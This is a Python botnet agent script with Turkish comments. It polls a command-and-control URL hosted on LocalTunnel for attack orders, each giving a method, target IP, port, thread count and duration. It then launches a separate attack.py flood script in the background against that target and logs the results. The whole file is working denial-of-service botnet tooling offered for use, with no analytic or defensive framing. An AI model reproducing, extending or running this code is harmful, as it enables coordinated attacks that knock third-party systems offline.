#!/usr/bin/env python3
import os
import time
import requests
import subprocess

# --- AYARLAR ---
# LocalTunnel linkin (Beyin adresi)
MASTER_URL = "https://shy-otters-trade.loca.lt" 
ZOMBI_AD = f"Zombi-{os.uname()[1]}"

def komut_dinle():
    print(f"🚀 {ZOMBI_AD} tam yetkiyle hazır!")
    print(f"📡 Komut Formatı: /method ip port thread süre")
    
    while True:
        try:
            # LocalTunnel bypass ve güvenli bağlantı
            headers = {
                'bypass-tunnel-reminder': 'true',
                'User-Agent': 'Zombi-Commander-V1'
            }
            
            # Beyin'den (Panelden) gelen veriyi çek
            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                
                # Panelden gelen verileri parçalıyoruz
                method = data.get("method")
                target = data.get("target")
                port = data.get("port", 80)
                # THREAD ARTIK SENİN KOMUTUNDAN GELİYOR
                thread_sayisi = data.get("threads") 
                sure = data.get("duration", 60)

                if method and target:
                    # Eğer panelden thread gelmezse güvenlik için 100 kullanır
                    t = thread_sayisi if thread_sayisi else 100
                    
                    print(f"\n[!] OPERASYON BAŞLADI!")
                    print(f"🎯 Hedef: {target}:{port} | 🌪️ Thread: {t} | 🕒 Süre: {sure}s")

                    # Attack.py'yi senin verdiğin thread sayısıyla ateşle
                    attack_cmd = [
                        "python3", "attack.py", 
                        str(method), str(target), str(port), 
                        str(t), str(sure)
                    ]
                    
                    # Logları attack.log'a yazarak arka planda çalıştır
                    with open("attack.log", "a") as log_file:
                        subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
                    
                    print(f"✅ Saldırı emri iletildi. Mermiler yolda!")

            time.sleep(5)
            
        except requests.exceptions.ConnectionError:
            print("⚠️ Beyin bağlantısı koptu, linki tazele kanka!")
            time.sleep(10)
        except Exception as e:
            print(f"⚠️ Hata: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # Yetkileri tazele
    os.system("chmod +x attack.py slave.py")
    komut_dinle()
